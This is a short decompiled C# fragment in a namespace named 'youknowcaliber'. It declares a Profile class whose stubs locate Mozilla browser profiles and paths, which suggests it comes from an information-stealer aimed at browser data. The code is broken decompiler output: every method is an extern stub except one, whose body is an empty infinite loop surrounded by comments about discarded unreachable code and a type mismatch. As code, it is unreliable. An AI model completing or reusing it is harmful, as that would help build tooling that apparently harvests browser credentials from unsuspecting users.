namespace youknowcaliber;

internal class Profile
{
	private static extern string[] Concat(string[] x, string[] y);

	private static string[] ProgramFilesChildren()
	{
		//Discarded unreachable code: IL_0005, IL_000f, IL_0016, IL_001d, IL_0022, IL_0027, IL_002d, IL_0031
		//IL_0007: Expected I, but got I8
		while (true)
		{
		}
	}

	public static extern string GetProfile(string path);

	public static extern string GetMozillaPath();

	public static extern string[] GetMozillaBrowsers();

	public extern Profile();
}
